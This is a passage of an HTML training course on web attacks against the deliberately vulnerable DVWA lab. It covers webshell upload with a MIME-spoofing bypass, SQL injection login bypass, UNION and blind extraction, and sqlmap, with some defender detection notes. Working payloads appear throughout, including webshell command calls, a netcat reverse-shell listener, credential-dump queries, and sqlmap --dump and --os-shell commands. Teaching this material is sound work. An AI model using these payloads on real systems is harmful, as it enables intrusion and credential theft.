+<b>Upload it</b> &mdash; DVWA &rarr; File Upload, Low. Submit <span class="mono">shell.php</span> and note the stored path:
+<pre><code># DVWA prints:  ../../hackable/uploads/shell.php succesfully uploaded!
+# on Medium/High the .php is blocked — bypass in the next step.</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>On Low it uploads directly. Note the path &mdash; you need it to reach the shell.</li></ul></div>
+</li>
+<li>
+<b>Bypass a filter</b> (Medium checks MIME) &mdash; intercept in Burp and spoof the type:
+<pre><code># In Burp, on the upload request change:
+#   filename="shell.php"   (keep)
+#   Content-Type: image/jpeg   (spoof)
+# or add magic bytes:  first line 'GIF89a;' then the PHP, name it shell.php</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Spoofing the MIME (or prepending image magic bytes) slips the PHP past a content check that trusts the client &mdash; the filter was never really server-side.</li></ul></div>
+</li>
+<li>
+<b>Execute</b> &mdash; browse to the uploaded shell and run commands:
+<pre><code>curl 'http://DVWA/hackable/uploads/shell.php?c=id'
+# uid=33(www-data) ...
+curl 'http://DVWA/hackable/uploads/shell.php?c=uname+-a'
+# upgrade: point php-reverse-shell at a `nc -lvnp 4444` listener for an interactive shell</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Command output proves RCE. A reverse shell gives you an interactive foothold &mdash; and now Sessions 5&ndash;6 (upgrade, escalate) take over from the web.</li></ul></div>
+</li>
+</ol>
+      <div class="box key-takeaway"><span class="box-t">The web-to-foothold shortcut</span><p><strong class="hl">A stored, executable upload is a shell.</strong> You bypassed a client-trusting filter and ran code on the server. The chain from here &mdash; upgrade, escalate, persist &mdash; is exactly Sessions 5&ndash;6, reached through a web form.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Break &amp; checkpoint">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P15</span><span class="tag break">Pause &middot; 10 min</span><span class="time">&#9201; 10 min</span></div>
+      <h1>Halfway &mdash; From Browser to Server</h1>
+      <p class="lede">You have worked the client and server tiers. After the break: the database tier &mdash; SQL injection, the most impactful web flaw.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">What you have done</span><p>First half: the web stack, Burp interception, enumeration, and four attack families &mdash; XSS (browser), file upload and command injection (server), and IDOR (access control). You landed a shell through a web form. Second half is the <strong>database tier</strong>: SQL fundamentals, then SQL injection from a one-line auth bypass through UNION and blind extraction to <span class="mono">sqlmap</span> &mdash; ending on detection and the finding report.</p></div><div class="box do"><span class="box-t">Stretch-break checklist</span><p>Delete any webshells you uploaded. Keep Burp running and DVWA logged in. Note the endpoints you found in enumeration &mdash; one of them is your SQLi target after the break. Back in five.</p></div><div class="box key-takeaway"><span class="box-t">The pivot to the database</span><p><strong class="hl">Same root cause, higher stakes.</strong> XSS and command injection were data-as-code at the browser and OS. SQL injection is data-as-code at the database &mdash; where all the records live.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="SQL fundamentals">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P16</span><span class="tag theory">Method &middot; how a query works</span><span class="time">&#9201; 7 min</span></div>
+      <h1>SQL Fundamentals &mdash; The Query Behind the Login</h1>
+      <p class="lede">You cannot inject into a language you cannot read. Learn just enough SQL to see why one quote breaks a login wide open.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The query is a sentence built from your input</span><p>When you log in, the server builds a SQL sentence and asks the database to run it. The vulnerability is entirely about <strong>how</strong> it builds that sentence: if it glues your input into the string, your input can change the sentence&#39;s meaning. Read the query below and the exploit becomes obvious.</p></div>
+      <div class="tbl-scroll">
+      <table><colgroup><col style="width:38%"><col style="width:62%"></colgroup>
+      <thead><tr><th>SQL piece</th><th>What it does</th></tr></thead>
+      <tbody>
+      <tr><td><span class="mono">SELECT cols FROM t</span></td><td>read columns from a table</td></tr>
+      <tr><td><span class="mono">WHERE user='x'</span></td><td>filter rows by a condition &mdash; the login check lives here</td></tr>
+      <tr><td><span class="mono">UNION SELECT ...</span></td><td>append the results of a second query &mdash; the key to data extraction</td></tr>
+      <tr><td><span class="mono">-- </span> or <span class="mono">#</span></td><td>comment: everything after it is ignored &mdash; used to cut off the rest of the original query</td></tr>
+      <tr><td><span class="mono">' </span>(single quote)</td><td>ends a string literal &mdash; the character that breaks a naively-built query</td></tr>
+      </tbody></table></div>
+      <div class="box intro"><span class="box-t">The vulnerable login query</span><p>The server runs: <span class="mono">SELECT * FROM users WHERE user='<b>INPUT</b>' AND pass='<b>INPUT</b>'</span>. Your input lands <em>inside</em> the quotes. So what happens if your input <strong>contains a quote</strong>? You escape the string and the rest of your input becomes SQL logic &mdash; that is the entire idea of injection.</p></div>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; break the query on paper first</span><pre><code># The app builds:   SELECT * FROM users WHERE user='INPUT' AND pass='INPUT'
+# You enter as the username:   ' OR '1'='1' -- 
+# The query becomes:
+#   SELECT * FROM users WHERE user='' OR '1'='1' -- ' AND pass='...'
+#   -> WHERE (false OR true)  -> returns the first row  -> logged in, no password</code></pre><p style="margin-top:8px"><b>You should see:</b> trace it by hand: your quote closes the username string, <span class="mono">OR '1'='1'</span> makes the condition always true, and <span class="mono">--</span> comments out the password check. Reading the query is the whole skill &mdash; the payload writes itself.</p></div><div class="box key-takeaway"><span class="box-t">Injection is escaping the string</span><p><strong class="hl">A single quote is the key.</strong> If your input sits inside a quoted string that is glued into a query, a <span class="mono">'</span> escapes it and everything after becomes logic. Read the query, find the quote, own the database.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="SQLi: auth bypass">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P17</span><span class="tag attack">Attack &middot; the login break</span><span class="time">&#9201; 7 min</span></div>
+      <h1>SQL Injection &mdash; Bypass the Login</h1>
+      <p class="lede">The classic first SQLi: turn the password check into &quot;always true&quot; and walk in. Watch the query change under your input.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Injection at the database tier</span><p>You read the vulnerable login query on the last page. Now inject it. By supplying <span class="mono">' OR '1'='1' -- </span> as the username, you close the string, add an always-true condition, and comment out the password check &mdash; the database returns a valid row and the app logs you in. Watch it play out.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="SQL injection auth bypass: the attacker's input rewrites the WHERE clause so the login query always returns a user row.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">enters a payload</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">WEB APP</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">builds the query</text>
+          <line x1="520" y1="80" x2="520" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">DATABASE</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">runs it</text>
+          <line x1="890" y1="80" x2="890" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <text x="352" y="106" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">username:  ' OR '1'='1' -- </text>
+          <path d="M191,120 L514,120" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <rect x="245" y="152" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--orange)"/>
+          <text x="470" y="172" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--orange)">query becomes: ...WHERE user='' OR '1'='1' -- ' AND pass=...</text>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="705" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">DB evaluates:  WHERE (false OR true)</text>
+          <path d="M526,228 L884,228" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:26px">
+          <text x="705" y="268" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">returns the first user row</text>
+          <path d="M884,282 L526,282" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:26px">
+          <text x="352" y="322" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">app logs the attacker in</text>
+          <path d="M514,336 L191,336" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>Instead of a name, the attacker sends SQL metacharacters into the field.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>The quote closes the username; OR '1'='1' is always true; -- comments out the AND pass check.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>The condition is now always true, so the database matches rows regardless of the password.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>Often the first row is the admin. No valid credentials were ever supplied.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>The app trusts "a row came back" as "credentials valid" &mdash; authentication bypassed.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; bypass a login with one payload</span><pre><code># In the USERNAME field (password anything), try each until one logs you in:
+' OR '1'='1' -- 
+' OR 1=1 #
+admin' -- 
+admin'/*
+# each closes the string and neutralises the password check</code></pre><p style="margin-top:8px"><b>You should see:</b> one of these returns a user row and logs you in with no valid password. Which comment style works (<span class="mono">--</span> vs <span class="mono">#</span>) hints at the backend DB &mdash; useful for the extraction that follows.</p></div><div class="box key-takeaway"><span class="box-t">Always-true + comment-out</span><p><strong class="hl">Escape the string, force a true condition, comment out the rest.</strong> That is the auth-bypass template. It is also the proof the input reaches the query unsanitised &mdash; which means you can extract data, not just log in.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="SQLi types">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P18</span><span class="tag theory">Method &middot; three visibilities</span><span class="time">&#9201; 6 min</span></div>
+      <h1>The Three Faces of SQL Injection</h1>
+      <p class="lede">How you extract data depends on what the app shows you. Learn to recognise in-band, blind-boolean, and blind-time targets.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Classify by what you can see</span><p>Auth bypass is one trick; <strong>data extraction</strong> is the goal. Your method depends on how much the app reveals. If results come back in the response, you extract fast (in-band). If not, you infer the data one bit at a time from the app&#39;s behaviour (blind). Click each.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 190" role="img" aria-label="The three types of SQL injection by visibility: in-band, blind boolean, and blind time-based. Click each.">
+          <g class="node" data-node="inband" tabindex="0"><rect x="30" y="45" width="270" height="110" rx="12" fill="#241417" stroke="#ff7043"/><text class="d-title" x="165" y="80" text-anchor="middle" font-size="14" fill="#ff7043">IN-BAND (classic)</text><text class="d-sub" x="165" y="104" text-anchor="middle">results shown in the response</text><text class="d-sub" x="165" y="124" text-anchor="middle">UNION / error-based</text><text class="d-sub" x="165" y="144" text-anchor="middle">fastest &mdash; you see the data</text></g>
+          <g class="node" data-node="bool" tabindex="0"><rect x="335" y="45" width="270" height="110" rx="12" fill="#1f2533" stroke="#fbbf24"/><text class="d-title" x="470" y="80" text-anchor="middle" font-size="14" fill="#fbbf24">BLIND &mdash; BOOLEAN</text><text class="d-sub" x="470" y="104" text-anchor="middle">no data, but true/false</text><text class="d-sub" x="470" y="124" text-anchor="middle">responses DIFFER</text><text class="d-sub" x="470" y="144" text-anchor="middle">infer bit by bit</text></g>
+          <g class="node" data-node="time" tabindex="0"><rect x="640" y="45" width="270" height="110" rx="12" fill="#1a1f2a" stroke="#22d3ee"/><text class="d-title" x="775" y="80" text-anchor="middle" font-size="14" fill="#22d3ee">BLIND &mdash; TIME</text><text class="d-sub" x="775" y="104" text-anchor="middle">no visible difference</text><text class="d-sub" x="775" y="124" text-anchor="middle">SLEEP() delays the reply</text><text class="d-sub" x="775" y="144" text-anchor="middle">infer via timing</text></g>
+        </svg>
+        <div class="dgm-hint">Click each &mdash; how you extract data when the app shows you more, or nothing.</div>
+        <div class="dgm-detail" data-detail="inband"><h5><span class="dd-tag">IN-BAND</span>The data comes back to you</h5><p><b>The app returns query results (or database errors) in the response, so you extract directly.</b> <b>UNION-based</b> appends your own SELECT to the output; <b>error-based</b> tricks the DB into leaking data inside an error message. Fastest and loudest. This is the DVWA-Low flow in Lab C.</p></div>
+        <div class="dgm-detail" data-detail="bool"><h5><span class="dd-tag">BLIND · BOOLEAN</span>Ask yes/no questions</h5><p><b>No data in the response, but a true condition and a false condition produce <em>different</em> pages (or status codes).</b> You ask the database one yes/no question at a time &mdash; &quot;is the first letter of the password &gt; m?&quot; &mdash; and read the answer from which page comes back. Slow, automatable, works when nothing is shown.</p></div>
+        <div class="dgm-detail" data-detail="time"><h5><span class="dd-tag">BLIND · TIME</span>Make the database wait</h5><p><b>When true and false look identical, inject a conditional delay:</b> <span class="mono">' OR IF(condition, SLEEP(5), 0) -- </span>. A 5-second response means the condition was true. The last-resort channel &mdash; when the app leaks nothing, timing still answers. Slowest, but nearly always possible.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; detect which type you have</span><pre><code># 1. In-band?  add a quote and look for an error / try ' ORDER BY 1 -- upward
+# 2. Boolean?  compare:  ' AND 1=1 --   (normal page)  vs  ' AND 1=2 --   (different page)
+# 3. Time?     ' AND SLEEP(5) --   (reply takes 5s = injectable, blind-time)</code></pre><p style="margin-top:8px"><b>You should see:</b> three quick probes classify the target: visible output = in-band (UNION), differing pages = blind-boolean, a measurable delay = blind-time. The type dictates your extraction technique for the rest of the attack.</p></div><div class="box key-takeaway"><span class="box-t">Method follows visibility</span><p><strong class="hl">See the data &rarr; UNION it out. See only behaviour &rarr; infer it.</strong> In-band is fast, blind is patient, time-based always works. Same vulnerability &mdash; the app&#39;s verbosity picks your technique.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="UNION extraction">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P19</span><span class="tag attack">Attack &middot; dump the database</span><span class="time">&#9201; 7 min</span></div>
+      <h1>UNION-Based SQLi &mdash; Dump the Whole Database</h1>
+      <p class="lede">When results are visible, UNION lets you append your own query and read any table. Watch the four-step extraction.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Append your query to theirs</span><p><span class="mono">UNION SELECT</span> joins the results of a second query onto the first, so the app displays <em>your</em> data where it meant to show its own. The method is mechanical: find the column count, find which columns display, then select from <span class="mono">information_schema</span> to map the database and dump the credentials. Watch it.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="UNION-based extraction: find the column count with ORDER BY, confirm displayed columns, enumerate schema from information_schema, then dump the users table.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">crafts UNIONs</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">WEB APP</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">runs each query</text>
+          <line x1="520" y1="80" x2="520" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">DATABASE</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">returns data</text>
+          <line x1="890" y1="80" x2="890" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <text x="352" y="106" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">1 · ' ORDER BY 3 -- (find column count)</text>
+          <path d="M191,120 L514,120" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="352" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">2 · ' UNION SELECT 1,2,3 -- (which show?)</text>
+          <path d="M191,174 L514,174" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="705" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">3 · UNION SELECT table_name,.. FROM information_schema.tables</text>
+          <path d="M526,228 L884,228" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:26px">
+          <text x="537" y="268" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">4 · UNION SELECT user,password FROM users</text>
+          <path d="M884,282 L191,282" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">SOC flip: UNION / information_schema in the query &amp; access log</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>Increase N until the query errors: N-1 is the column count. UNION needs a matching number of columns.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>The numbers that appear on the page are the columns you can print data into.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>information_schema is the database describing itself &mdash; it lists every table and column. Now you know where the users table is.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>Dump the credentials directly into the page. Password hashes go to hashcat (Session 4).</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>The literal strings UNION SELECT and information_schema in a request parameter are high-signal WAF/log detections.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; walk the UNION method on DVWA (Low)</span><pre><code>' ORDER BY 2 -- -              # 2 columns? (error at 3 confirms)
+' UNION SELECT 1,2 -- -           # see which columns print
+' UNION SELECT table_name,NULL FROM information_schema.tables -- -
+' UNION SELECT user,password FROM users -- -   # dump creds</code></pre><p style="margin-top:8px"><b>You should see:</b> four requests take you from &quot;there is an injection&quot; to &quot;here are all the usernames and password hashes.&quot; The <span class="mono">information_schema</span> step is what makes it work on a database you have never seen.</p></div><div class="box key-takeaway"><span class="box-t">Count, confirm, map, dump</span><p><strong class="hl">UNION extraction is a fixed four-step recipe.</strong> Column count &rarr; visible columns &rarr; schema from <span class="mono">information_schema</span> &rarr; dump. Learn the recipe once and it works on any in-band target.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Blind SQLi">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P20</span><span class="tag attack">Attack &middot; infer without output</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Blind SQLi &mdash; Extract Data You Cannot See</h1>
+      <p class="lede">When the app shows nothing, you ask the database yes/no questions and read the answers from its behaviour. Slow, mechanical, unstoppable.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Twenty questions with the database</span><p>Blind injection has no visible output &mdash; but the app still <em>behaves</em> differently for a true vs a false condition (a different page, or a delay). So you extract data one yes/no question at a time: &quot;is the first character of the admin password greater than &#39;m&#39;?&quot; Narrow it down, move to the next character, repeat. Tedious by hand, instant with a tool &mdash; but you must understand it to trust the tool.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="Blind boolean/time SQLi: the attacker asks a yes/no question in the payload and reads the answer from whether the page differs or the response is delayed.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">asks yes/no</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">WEB APP</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">true vs false</text>
+          <line x1="520" y1="80" x2="520" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">DATABASE</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">evaluates</text>
+          <line x1="890" y1="80" x2="890" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <text x="352" y="106" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">' AND SUBSTRING(pw,1,1)>'m' -- </text>
+          <path d="M191,120 L514,120" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="705" y="160" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">DB evaluates the condition</text>
+          <path d="M526,174 L884,174" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:26px">
+          <text x="705" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--orange)">true &rarr; normal page / false &rarr; different</text>
+          <path d="M884,228 L526,228" fill="none" stroke="var(--orange)" stroke-width="2.4" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:26px">
+          <text x="352" y="268" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">attacker reads the bit &rarr; next question</text>
+          <path d="M514,282 L191,282" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">SOC flip: a flood of near-identical requests</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>The payload embeds a yes/no question about the data &mdash; here, comparing the first password character.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>The database returns true or false &mdash; but the value is never shown to the attacker directly.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>Boolean-blind: the two cases render differently. Time-blind: true triggers SLEEP(5) and the reply is delayed.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>One bit learned. Binary-search each character, then move on &mdash; thousands of requests reconstruct the password.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>Hundreds of requests to one parameter differing by one character, or many SLEEP-length responses, is an obvious automated-SQLi signature.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; confirm blind SQLi with a timing probe</span><pre><code># If nothing is ever shown, prove injection by controlling the response time:
+' AND SLEEP(5) -- -              # reply takes ~5s  = injectable
+' AND IF(1=1,SLEEP(5),0) -- -     # true branch delays
+' AND IF(1=2,SLEEP(5),0) -- -     # false branch is fast
+# the delay difference IS the data channel</code></pre><p style="margin-top:8px"><b>You should see:</b> the 5-second delay on the true condition and instant reply on the false one is a working yes/no oracle &mdash; enough to extract any value, blind. This is precisely what <span class="mono">sqlmap</span> automates next.</p></div><div class="box key-takeaway"><span class="box-t">Behaviour is a data channel</span><p><strong class="hl">No output is not no injection.</strong> A differing page or a controllable delay lets you infer any value bit by bit. It is slow by hand &mdash; which is exactly why the next tool exists.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="sqlmap">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P21</span><span class="tag tool">Tool &middot; automate the extraction</span><span class="time">&#9201; 7 min</span></div>
+      <h1>sqlmap &mdash; Automated SQL Injection</h1>
+      <p class="lede">The tool that does the tedious part perfectly. But it only helps if you understand the manual attack it is automating.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Automate what you now understand</span><p>You have done column-counting and blind bit-inference by hand &mdash; slow and error-prone. <strong>sqlmap</strong> automates all of it: it detects the injection, identifies the DBMS, and extracts databases, tables, and rows, including the blind and time-based cases you would never finish manually. Because you understand the manual method, you can drive it precisely and trust its output.</p></div>
+      <h2 class="mono" style="color:var(--orange)"><span class="h-t">sqlmap &mdash; the 7-part frame</span></h2>
+<div class="tbl-scroll">
+<table><colgroup><col style="width:38%"><col style="width:62%"></colgroup>
+<tbody>
+<tr><td style="width:150px"><strong>What it is</strong></td><td>An automated SQL-injection detection and exploitation tool. Give it a request; it finds injectable parameters, fingerprints the DBMS, and extracts data using in-band, blind-boolean, and time-based techniques.</td></tr>
+<tr><td style="width:150px"><strong>Why it exists</strong></td><td>To do the mechanical, high-volume part &mdash; column counts, thousands of blind yes/no requests, DBMS-specific syntax &mdash; perfectly and fast, so the analyst focuses on scope and findings.</td></tr>
+<tr><td style="width:150px"><strong>The method</strong></td><td>Capture a real request (Burp &rarr; save to a file), point sqlmap at it, and escalate scope gradually: confirm &rarr; list databases &rarr; tables &rarr; dump the interesting table. Feed it the whole request so it keeps your session/cookies.</td></tr>
+<tr><td style="width:150px"><strong>Real syntax</strong></td><td><pre><code>sqlmap -u "http://target/page?id=1" --batch --dbs
+sqlmap -r request.txt --batch            # from a saved Burp request (keeps cookies)
+sqlmap -r request.txt -D appdb --tables
+sqlmap -r request.txt -D appdb -T users --dump
+sqlmap -r request.txt --os-shell         # when the DBMS allows OS command exec</code></pre></td></tr>
+<tr><td style="width:150px"><strong>Read the output</strong></td><td>sqlmap reports the injectable parameter, the <b>technique</b> (B/E/U/T/S) and the <b>DBMS</b>, then prints extracted tables/rows. <span class="mono">--dump</span> shows the data; it even offers to crack hashes it recognises.</td></tr>
+<tr><td style="width:150px"><strong>What it feeds</strong></td><td>Dumped credentials go to hashcat (S4) and to lateral movement; <span class="mono">--os-shell</span> is a direct foothold (S5&ndash;S6); the finding goes in the report.</td></tr>
+<tr><td style="width:150px"><strong>SOC flip</strong></td><td><span style="color:var(--green)">Extremely loud.</span> sqlmap sends a large volume of probing requests with tell-tale payloads and a default User-Agent &mdash; a WAF or an access-log rate/pattern rule flags it immediately. On a real test you tune <span class="mono">--delay</span>, <span class="mono">--random-agent</span>, and tamper scripts.</td></tr>
+</tbody></table>
+</div>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; let sqlmap confirm and enumerate</span><pre><code>sqlmap -u 'http://DVWA/vulnerabilities/sqli/?id=1&Submit=Submit' \
+  --cookie='PHPSESSID=...; security=low' --batch --dbs
+# then narrow:
+sqlmap -u '...id=1...' --cookie='...' -D dvwa --tables
+sqlmap -u '...id=1...' --cookie='...' -D dvwa -T users --dump</code></pre><p style="margin-top:8px"><b>You should see:</b> sqlmap reproduces your manual UNION/blind extraction in seconds and dumps the users table &mdash; but you can read its output critically only because you did it by hand first. The tool is a force multiplier, not a substitute for understanding.</p></div><div class="box key-takeaway"><span class="box-t">Understand first, automate second</span><p><strong class="hl">sqlmap is fast because you are slow by hand.</strong> Manual method builds the judgement; the tool provides the speed. Drive it with a real request, escalate scope deliberately, and remember how loud it is.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab C: manual SQLi">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P22</span><span class="tag lab">Hands-on &middot; everyone &middot; attack</span><span class="time">&#9201; 18 min</span></div>
+      <h1>Lab C &mdash; SQL Injection by Hand on DVWA</h1>
